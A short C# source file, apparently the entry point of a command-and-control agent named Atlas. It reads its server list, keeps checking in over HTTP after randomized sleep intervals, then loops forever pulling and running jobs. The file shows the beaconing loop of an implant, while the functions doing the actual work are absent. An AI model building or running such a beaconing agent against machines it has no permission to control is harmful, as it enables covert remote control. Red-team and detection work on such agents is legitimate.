namespace Atlas
{
    class Program
    {
        public static void Main(string[] args)
        {
            Utils.GetServers();
            while (!Http.CheckIn())
            {
                int Dwell = Utils.GetDwellTime();
                System.Threading.Thread.Sleep(Dwell);
            }
            Utils.JobList JobList = new Utils.JobList
            {
                job_count = 0,
                jobs = { }
            };
            while (true)
            {
                Utils.Loop(JobList);
                int Dwell = Utils.GetDwellTime();
                System.Threading.Thread.Sleep(Dwell);
            }
        }
    }
}
